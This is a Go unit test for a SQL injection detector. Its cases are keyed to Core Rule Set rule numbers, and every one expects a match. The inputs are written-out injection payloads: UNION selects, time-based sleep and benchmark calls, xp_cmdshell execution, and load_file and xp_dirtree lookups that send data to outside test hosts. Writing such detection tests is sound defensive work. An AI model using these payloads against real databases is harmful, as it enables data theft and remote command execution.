package sqli

import (
	"reflect"
	"testing"
)

func TestSqli(t *testing.T) {
	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	testGroup := map[string]testCase{
		// 942100
		"case942100-1":  {"1234 OR 1=1", true},
		"case942100-2":  {"-1839' or '1'='1", true},
		"case942100-3":  {`-1839" or "1"="2`, true},
		"case942100-4":  {"var=2010-01-01'+sleep(20.to_i)+'", true},
		"case942100-5":  {"var=EmptyValue' and 526=527", true},
		"case942100-6":  {"var=foo') UNION ALL select NULL --", true},
		"case942100-7":  {"var=foo')waitfor%20delay'5%3a0%3a20'--", true},
		"case942100-8":  {"var=JKGHUKGDI8TDHLFJH72FZLFJSKFH' and sleep(12) --", true},
		"case942100-9":  {"var=/path/to/file/unitests.txt') UNION ALL select NULL --", true},
		"case942100-10": {"1'||(select extractvalue(xmltype('<?xml version=\\\"1.1\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % toyop SYSTEM \\\"https://coreruleset.org/\\\">%toyop;", true},
		"case942100-11": {"sleep(20)", true},
		"case942100-12": {`unittests@coreruleset.org" sleep(10.to_i) "`, true},
		"case942100-13": {`" | type %SystemDrive%\\\\config.ini | "`, true},
		"case942100-14": {`var=\"unittests@coreruleset.org\"')) and (select*from(select(sleep(5)))x) --`, true},
		//942140
		"case942140-1":  {"/?sql_table=pg_catalog", true},
		"case942140-2":  {"INFORMATION_SCHEMA", true},
		"case942140-3":  {"database(", true},
		"case942140-4":  {"db_name(", true},
		"case942140-5":  {"DaTaBasE(", true},
		"case942140-6":  {"InFoRmaTioN_ScHemA", true},
		"case942140-7":  {"DB_NAME(", true},
		"case942140-8":  {"tempdb", true},
		"case942140-9":  {"msdb", true},
		"case942140-10": {"mysql.db", true},
		"case942140-11": {"MSysAccessObjects", true},
		"case942140-12": {"Northwind", true},
		"case942140-14": {"SCHEMA_NAME", true},
		"case942140-15": {"DATABASE(", true},
		"case942140-17": {"information_schema", true},
		// 942151
		"case942151-1":  {`var=foo'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \"https://unit'||'tests.coreruleset.org/\">%tocob;`, true},
		"case942151-2":  {`var=/config.txt' (select load_file('\\\\\\\\unittests.coreruleset.org\\\\zow')) '`, true},
		"case942151-3":  {`var=(select load_file('\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\\\\\\\\\hvs'))`, true},
		"case942151-4":  {"var=, FIND_IN_SET('22', Category )", true},
		"case942151-5":  {"email=1'%20%2B%201%20is%20likelihood(0.0%2C0.0)%20is%201--", true},
		"case942151-6":  {"email=admin%40example.com'%20or%20sqlite_compileoption_used%20(id)--", true},
		"case942151-7":  {"email=admin%40example.com'and%20not%20sqlite_compileoption_get%20(id)--", true},
		"case942151-8":  {"starts_with(password,'a')::int", true},
		"case942151-9":  {"/index.php?id=jsonb_pretty(...(1,password)::jsonb)::int", true},
		"case942151-10": {"/index.php?id=...(json_build_object(1,password)::jsonb)::int", true},
		"case942151-11": {"/index.php?id=unistr(password)::int", true},
		// 942160
		"case942160-1":  {"/?sql_table=sleep%28534543%29", true},
		"case942160-2":  {"sleEP(3)", true},
		"case942160-3":  {"sleep(5000)", true},
		"case942160-4":  {"BENChmARk(2999/**/999,Md5(NoW()", true},
		"case942160-5":  {"BEncHMARk(2999999,Md5(NoW('')", true},
		"case942160-6":  {"BENCHMARK(5000000,MD5(0x48416166)", true},
		"case942160-7":  {"benchmark(3000000,M%445(4)", true},
		"case942160-8":  {"pay=BENCHMARK(1000000, md5\\\" AND 1883=1883-- GSCC('')", true},
		"case942160-9":  {"pay=BeNChMaRK(1000000, md5 AND 9796=4706('')", true},
		"case942160-10": {"/if(now()=sysdate(),sleep(12),0)", true},
		// 942170
		"case942170-1": {"/?var=SELECT%20BENCHMARK%281000000%2C1%2B1%29%3B", true},
		"case942170-2": {"/?var=%3B%20sleep%280%29", true},
		"case942170-3": {"/?var=I%20sleep%20well%21", true},
		"case942170-4": {"/?test=select+if(x", true},
		//
		"case942190-1":  {"/?var=%20exec%20xp_cmdshell", true},
		"case942190-2":  {"%22%21%22%0A", true},
		"case942190-3":  {"%22+union+select%0A", true},
		"case942190-4":  {"current_user%28%0A", true},
		"case942190-5":  {"FROM+INFORMATION_SCHEMA.%0A", true},
		"case942190-6":  {"%27%3BSELECT+P%0A", true},
		"case942190-7":  {"UnIon+seleCt%0A", true},
		"case942190-8":  {"%27union%20select%2F%0A", true},
		"case942190-9":  {"from+information_schema.%0A", true},
		"case942190-10": {"select%5D%3Dpolygon%28%28%2F%2A%2100000select%2A%2F%2A%2F%2A%2100000from%2A%2F%28%2F%2A%2100000select%2A%2F%2A%2F%2A%2100000from%2A%2F%28%2F%2A%2100000select%2A%2Fconcat_ws%280x7e3a%2C0x6d616b6d616e%2Cversion%28%29%2Cuser%28%0A", true},
		"case942190-11": {"user%28%0A", true},
		"case942190-12": {"database%28%0A", true},
		"case942190-13": {"select%28user%28%0A", true},
		"case942190-14": {"SeLect%2A%2F+1%2C2%2C3%2Cuser%28%0A", true},
		"case942190-15": {"select%5D%3D%28ExtractValue%281%2C%28select%2520concat_ws%280x3a%2Cuser%28%0A", true},
		"case942190-16": {"from+%60information_schema%60%0A", true},
		"case942190-17": {"%27select+H%0A", true},
		"case942190-18": {"%27%3Bselect+p%0A", true},
		"case942190-19": {"FROM+INFORMATION_SCHEMA.%0A", true},
		"case942190-20": {"+EXEC+xp_cmdshell%0A", true},
		"case942190-21": {"%22%21+Y%0A", true},
		"case942190-22": {"exec+master.%0A", true},
		"case942190-23": {"into+outfile+%27%0A", true},
		"case942190-24": {"Union+sElect%0A", true},
		"case942190-25": {"selectect%2520user%28%0A", true},
		"case942190-26": {"+exec+master..xp_cmdshell%0A", true},
		"case942190-27": {"selectect%252520user%28%0A", true},
		"case942190-28": {"execution%3De1s1%26OlyH%3D9767+AND+1%3D1+UNION+ALL+SELECT+1%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name+FROM+information_schema.tables+WHERE+2%3E1--%2F%2A%2A%2F%3B+EXEC+xp_cmdshell%0A", true},
		"case942190-29": {"%27%21%60%0A", true},
		"case942190-30": {"%22%20UNION%20ALL%20SELECT%0A", true},
		"case942190-31": {"EXec+xp_cmdshell%0A", true},
		"case942190-32": {"FrOM+information_schema.%0A", true},
		"case942190-33": {"select+1+FROM%28select+count%28%2A%29%2Cconcat%28%28select+%28select+concat%28user%28%0A", true},
		"case942190-34": {"%60%211%0A", true},
		"case942190-35": {"uNioN++sElecT%0A", true},
		"case942190-36": {"%22%3BSELECT+P%0A", true},
		"case942190-37": {"pay=UnIoN+SeLeCt%0A", true},
		"case942190-38": {`var=1);declare @q varchar(99);set @q='\\\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\\kph'; exec master.dbo.xp_dirtree @q;--`, true},
		"case942190-39": {`var=content.ini);declare @q varchar(99);set @q='\\\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\\lri'; exec master.dbo.xp_dirtree @q;--`, true},
		"case942190-40": {`var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\\\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\\vcr'; exec master.dbo.xp_dirtree @q;--`, true},
		"case942190-41": {`var=test));declare @q varchar(99);set @q='\\\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\\gej'; exec master.dbo.xp_dirtree @q;--`, true},
		"case942190-42": {"id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union%23%0adistinctrow%0bselect@.", true},
		"case942190-43": {"arg=Die%20%22Union%20von%20Europa%22", true},
		"case942190-44": {"arg=SELECT%20IIF(1%20%3E%201%2C%20'TRUE'%2C%20'FALSE'%20)", true},
		"case942190-45": {"arg=it%20is%20my%20beliif%20%28stemming%20from%20personal%20experience%29%2C%20that", true},
		"case942190-46": {"arg=appUser(sitename,user)", true},
		// 942220
		"case942220-1": {"/?string_to_convert=4294967296", true},
		"case942220-2": {"/?i=2.2250738585072011e-308", true},
		// 942230
		"case942230-1":  {"/?var=%29%20like%20%28", true},
		"case942230-2":  {"/?var=%29like%28", true},
		"case942230-3":  {"/?var=I%20like%20you%21", true},
		"case942230-4":  {"/?var=%20case%20when%20condition1%20then%20result1", true},
		"case942230-5":  {"/?var=having%20pain%21", true},
		"case942230-6":  {"/?var=SELECT%20x%20GROUP%20BY%20SOMETHING%20HAVING%20COUNT%28Id%29%20%3E%3D%209", true},
		"case942230-7":  {"/?var=SELECT%20%2A%20FROM%20%60movies%60%20GROUP%20BY%20%60category_id%60%2C%60year_released%60%20HAVING%20%60category_id%60%20%3D%208%3B", true},
		"case942230-8":  {"/?var=behaving%20badly%2F", true},
		"case942230-9":  {"/?var=o.havingu%40gmail.com", true},
		"case942230-10": {"/?var=if%282%3D", true},
		"case942230-11": {"/?var=Just%20in%20case%20%28abc%29", true},
		"case942230-12": {"/?var=if%281234%3D", true},
		// 942240
		"case942240-1":  {"%22+WAITFOR+DELAY+%27%0A", true},
		"case942240-2":  {"%22%3Bwaitfor+delay+%27%0A", true},
		"case942240-3":  {"%27%3BWAITFOR+DELAY+%27%0A", true},
		"case942240-4":  {"%27%3B+waitfor+delay+%27%0A", true},
		"case942240-5":  {"%27+waitfor+delay+%27%0A", true},
		"case942240-6":  {"%27%3B+WAITFOR+DELAY+%27%0A", true},
		"case942240-7":  {"%22+WAITFOR+DELAY+%27%0A", true},
		"case942240-8":  {"%22%3BWAITFOR+DELAY+%27%0A", true},
		"case942240-9":  {"pay=%22%3Bwaitfor+delay+%27%0A", true},
		"case942240-10": {"pay=ALTER+TABLE+%60mass_mails%60+CHANGE+%60receivers%60+%60receivers%60+ENUM%28%27FACILITIES%27%2C%27APPLICATION_2015%27%2C%27APPLICATION_2016%27%29+CHARACTER+SET+utf8%0A", true},
		"case942240-11": {"ALTER+TABLE+%60tx_v3appointment_domain_model_appointment%60+ADD+%60video%60+TEXT+CHARACTER+SET+latin1%0A", true},
		//
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
		//"case": {"", true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			got := matchSqli(v.value)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}
